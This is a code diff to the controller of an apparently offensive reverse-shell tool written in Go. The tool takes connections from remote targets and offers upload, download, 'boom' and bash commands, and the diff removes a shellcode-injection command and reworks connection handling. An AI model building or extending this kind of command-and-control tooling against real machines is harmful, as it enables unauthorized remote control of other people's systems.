@@ -47,9 +47,10 @@ func StartServer(userOP config.UserOperation) {
 }
 
 func handleClient(conn net.Conn) {
+	ymserv = nil
 	// start as tls server, means it's a reverse shell
 	fmt.Println("Connection established.")
-	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
+	fmt.Println("Commands: upload, download, boom, bash, exit, help. \n")
 	ymconf := yamux.Config{
 		AcceptBacklog:          256,
 		EnableKeepAlive:        true,
@@ -72,18 +73,17 @@ func handleClient(conn net.Conn) {
 		fmt.Printf("[ TARGET %s ] [>_] Controller $ ", conn.RemoteAddr().String())
 		useript := utils.ReadUserInput()
 		useriptD := strings.Split(useript, " ")
-		recvconn, err := ymserv.Accept()
-		if err != nil {
-			log.Println("Mux Error.")
-			continue
-		}
-		userCmd := &remoteop.UserCmd{}
-		err = userCmd.ParseUserInput(useriptD)
-		if err == errors.New("USER_EXIT") {
-			return
+		userCmd, err := remoteop.ParseUserInput(useriptD)
+		if fmt.Sprintf("%s", err) == "USER_EXIT" {
+			break
 		} else if err != nil {
 			log.Println(err)
 			continue
+		}
+		recvconn, err := ymserv.Accept()
+		if err != nil {
+			log.Println("Mux Error.")
+			break
 		}
 		_ = userCommandProcess(userCmd, recvconn)
 	}
@@ -135,27 +135,6 @@ func userCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 		}
 		_, err = checkRemoteResp(ctrlstem)
 		return err
-	case remoteop.CommandINJE:
-		curcmdmsg = &remoteop.CmdMsg{
-			Status:      remoteop.StatusOK,
-			Cmd:         remoteop.CommandINJE,
-			Msg:         ucmd.OptionRMT,
-			HasNext:     false,
-			NextIsBin:   false,
-			NextSize:    0,
-			NextBinHash: "",
-		}
-		data, err := json.Marshal(curcmdmsg)
-		if err != nil {
-			log.Println(err)
-			return err
-		}
-		_, err = ctrlstem.Write(data)
-		if err != nil {
-			log.Println(err)
-			return err
-		}
-		_, err = checkRemoteResp(ctrlstem)
 	case remoteop.CommandUPLD:
 		data, err := ioutil.ReadFile(ucmd.OptionLCL)
 		if err != nil {
@@ -318,7 +297,6 @@ func userCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 						_ = datastem.Close()
 						return err
 					}
-					_ = datastem.Close()
 					break
 				} else {
 					iptdt = append(iptdt, byte('\n'))
@@ -328,13 +306,13 @@ func userCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 						log.Println(err)
 						return err
 					}
-					_ = datastem.Close()
 				}
 			}
+			_ = datastem.Close()
 			return nil
 		}
 	default:
-		log.Fatalln("Internal Error")
+		log.Println("Internal Error")
 	}
 	return nil
 }
